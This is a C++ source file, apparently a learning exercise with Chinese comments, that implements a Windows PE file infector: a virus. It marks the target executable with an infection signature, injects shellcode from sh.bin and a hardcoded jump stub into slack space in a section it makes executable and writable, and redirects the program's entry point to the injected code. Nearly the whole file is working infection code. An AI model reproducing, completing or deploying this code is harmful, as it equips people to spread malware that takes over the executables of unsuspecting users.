#include <windows.h>
#include <winnt.h>
#include <iostream>
#include <cstdio>
using namespace std;

#define IMAGE_INFECTED_SINGNATURE 0x07290815

#define DEBUG 1

char jmpcode[] = "\xe9\x1b\x00\x00\x00\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x66\x50\x66\xb8\xa6\x26\xff\xd0\x66\x58\xc3\xcc\xcc\xcc\xcc\xcc\x55\x8b\xec\xe8\xe8\xff\xff\xff\x5d\xc3\xcc\xcc\xcc\xcc\xcc\xcc";//6a2a
    
void GetBytes(char * dst, size_t len, LONG offset_file, FILE *fp)
{
    int cnt = 0;
    if (fp == NULL)
    {
        return;
    }
    fseek(fp, offset_file, 0); //fp指针跳过offset的size
    while (len--)
    {
        #if 0
        printf("%c", fgetc(fp));
        #endif
        fscanf(fp, "%c", dst++);//fp处作为起始，赋值给dst
        cnt++;
    }
}

int judgePE(FILE *fp)
{
    if (fp == NULL){
        return -1;
    }
    IMAGE_DOS_HEADER DosHeader;
    GetBytes((char*)&DosHeader, sizeof(DosHeader), 0, fp);
    if (DosHeader.e_magic != IMAGE_DOS_SIGNATURE){
        fclose(fp);
        return 0;
    }

    IMAGE_NT_HEADERS nth;
    GetBytes((char*)&nth, sizeof(nth), DosHeader.e_lfanew, fp);
    if (nth.Signature != IMAGE_NT_SIGNATURE){
        fclose(fp);
        return 0;
    }
    DWORD infectSignature;
    GetBytes((char*)&infectSignature, sizeof(DWORD), sizeof(DosHeader), fp);
    if (infectSignature == IMAGE_INFECTED_SINGNATURE)
    {
        fclose(fp);
        return 2;
    }
    return 1;
}
LONG get_START_of_IMAGE_NT_HEADER(FILE *fp)
{
    LONG addr;
    GetBytes((char *)&addr, sizeof(LONG), sizeof(IMAGE_DOS_HEADER)-sizeof(LONG), fp);
    //sizeof(IMAGE_DOS_HEADER)-sizeof(LONG) 即e_lfanew 指向了PE头位置
#if 0
    printf("\naddr %x end get_START_of_IMAGE_NT_HEADER\n", addr);
#endif
    return addr;
}
_IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(FILE * fp)
{
    LONG addr = get_START_of_IMAGE_NT_HEADER(fp);
    char * NT = (char*)malloc(sizeof(_IMAGE_NT_HEADERS));
    memset(NT, 0, sizeof(_IMAGE_NT_HEADERS));
    GetBytes(NT, sizeof(_IMAGE_NT_HEADERS), addr, fp);
  
    //指向了PE头开始的位置
    return (_IMAGE_NT_HEADERS)*((_IMAGE_NT_HEADERS*)NT);//虽然不是很懂但大概就是把char流转化成IMAGE_NT_HEADER格式的意思?
}
WORD get_Number_OF_Section(FILE * fp)
{
    WORD rst = 0;
    _IMAGE_NT_HEADERS nt = get_IMAGE_NT_HEADER(fp);
    rst = nt.FileHeader.NumberOfSections;
    return rst;
}
void get_IMAGE_SECTION_TABLES(_IMAGE_SECTION_HEADER *sectiontables, WORD cnt, FILE *fp)
{
    LONG offset = get_START_of_IMAGE_NT_HEADER(fp) +sizeof(_IMAGE_NT_HEADERS);
    GetBytes((char*)sectiontables, sizeof(IMAGE_SECTION_HEADER)*cnt, offset, fp);
}
void Get_IMAGE_SECTION_TABLES(_IMAGE_SECTION_HEADER *sectiontables, WORD *cnt, FILE *fp)
{
    LONG offset = get_START_of_IMAGE_NT_HEADER(fp) +sizeof(_IMAGE_NT_HEADERS);
    char *secTable = (char *) malloc(sizeof(IMAGE_SECTION_HEADER)*(*cnt));
    memset(secTable, 0, sizeof(IMAGE_SECTION_HEADER)*(*cnt));
    GetBytes(secTable, sizeof(IMAGE_SECTION_HEADER)*(*cnt), offset, fp);
   #if DEBUG
    printf("sechead:%x\n", sectiontables);
    #endif

}
void SetBytes(char *src, int len, long offset_file, FILE *fp)
{
    int cnt = 0;
    fseek(fp, offset_file, 0);
    for (int i = 0; i < len;i++)
        fprintf(fp, "%c", src[i]);
}
void SetShellcode(int len, long offset_file, FILE *fp)
{
    int cnt = 0;
    char ch;
    fseek(fp, offset_file, 0);
    FILE *fshell = fopen("sh.bin", "rb+");
    for (int i = 0; i < len;i++){
        ch=fgetc(fshell);
        fputc(ch, fp);
    }
    fclose(fshell);
}

void infect(FILE *fp)
{
    _IMAGE_NT_HEADERS PEhd = get_IMAGE_NT_HEADER(fp);
    #if DEBUG
    printf("signature: %x\n", PEhd.Signature);
    #endif

    WORD sectionCnt = get_Number_OF_Section(fp);
	IMAGE_SECTION_HEADER*  sectionheaders = (IMAGE_SECTION_HEADER*)malloc(sizeof(IMAGE_SECTION_HEADER)*sectionCnt);
	get_IMAGE_SECTION_TABLES(sectionheaders, sectionCnt, fp);

	
    HANDLE hFile = CreateFileA("sh.bin", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("Open file error:%d\n", GetLastError());
        return;
    }
    DWORD codeAdd = GetFileSize(hFile, NULL);//和shellcode有关
    DWORD codeAddSize = codeAdd + strlen(jmpcode);
    CloseHandle(hFile);
    int slc = sectionCnt - 1;

    //开始查找能够插入病毒的节
    for (int i = 0; i < sectionCnt - 1; i++) {
        #if DEBUG
        printf("i:%d %x %x %x\n", i, sectionheaders[i+1].VirtualAddress, sectionheaders[i].VirtualAddress,sectionheaders[i].Misc.VirtualSize);
        #endif
        if ((sectionheaders[i+1].VirtualAddress - sectionheaders[i].VirtualAddress - sectionheaders[i].Misc.VirtualSize)
        > codeAddSize) {
            slc = i;
            break;
        }
    }

#if 1
    printf("total sectionnum: %d\nchoose sectiontable num:%d\n",sectionCnt, slc);
#endif
    sectionheaders[slc].Characteristics = 0xE00000E0;// IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    DWORD targetSectionEnd_FOA = sectionheaders[slc].PointerToRawData + sectionheaders[slc].Misc.VirtualSize;
    DWORD oldEntry = PEhd.OptionalHeader.AddressOfEntryPoint;

    
    DWORD fileAddSize = PEhd.OptionalHeader.FileAlignment * (1 + codeAddSize / PEhd.OptionalHeader.FileAlignment);
    //sectionheaders[slc].SizeOfRawData += fileAddSize;//DWORD
    sectionheaders[slc].Misc.VirtualSize += codeAddSize; //DWORD
#if 0
    printf("VirtualSiz:%x\n", sectionheaders[slc].Misc.VirtualSize);
    printf("targetSectionEnd_FOA:%x entrypoint:%x\n",targetSectionEnd_FOA, oldEntry);
#endif
    DWORD newentry_FOA = targetSectionEnd_FOA;
	DWORD newentry_RVA = sectionheaders[slc].VirtualAddress + sectionheaders[slc].Misc.VirtualSize;//sectionheaders[slc].SizeOfRawData;

    #if DEBUG
    printf("FOA:%x\n", targetSectionEnd_FOA);
    #endif
    SetShellcode(codeAdd, targetSectionEnd_FOA, fp);
    SetBytes((char*)&jmpcode, strlen(jmpcode), targetSectionEnd_FOA + codeAdd, fp);

    //修改一些标识（在dos头后
    DWORD infectedSignature = IMAGE_INFECTED_SINGNATURE;
    SetBytes((char*)&infectedSignature, sizeof(infectedSignature), sizeof(IMAGE_DOS_HEADER), fp);
    SetBytes((char*)&oldEntry, sizeof(oldEntry), sizeof(DWORD) + sizeof(IMAGE_DOS_HEADER), fp);//在dos头感染标记后加入原代码节entry
    //修改PE头
    LONG e_lfnew = get_START_of_IMAGE_NT_HEADER(fp);
    //optinal header中的AddressofEntryPoint
	SetBytes((char*)&newentry_RVA, sizeof(DWORD),  
e_lfnew + sizeof(PEhd.Signature) + sizeof(PEhd.FileHeader) + (char*)&PEhd.OptionalHeader.AddressOfEntryPoint - (char*)&PEhd.OptionalHeader, fp);
    
    SetBytes((char*)sectionheaders, sizeof(IMAGE_SECTION_HEADER) * sectionCnt, e_lfnew + sizeof(PEhd), fp);

}
int main()
{
    FILE *fp = fopen("test.exe", "rb+");
    int ret = judgePE(fp);//need to add
    if(ret == -1) {
        printf("open file error!");
        fclose(fp);
        return 0;
    }
    if(ret == 0) {
        printf("is not a PE file!");
        fclose(fp);
        return 0;
    }
    if(ret == 2) {
        printf("has been infected!");
        fclose(fp);
        return 0;
    }
    printf("openfile success!\n");
    infect(fp);
    fclose(fp);
    return 0;
}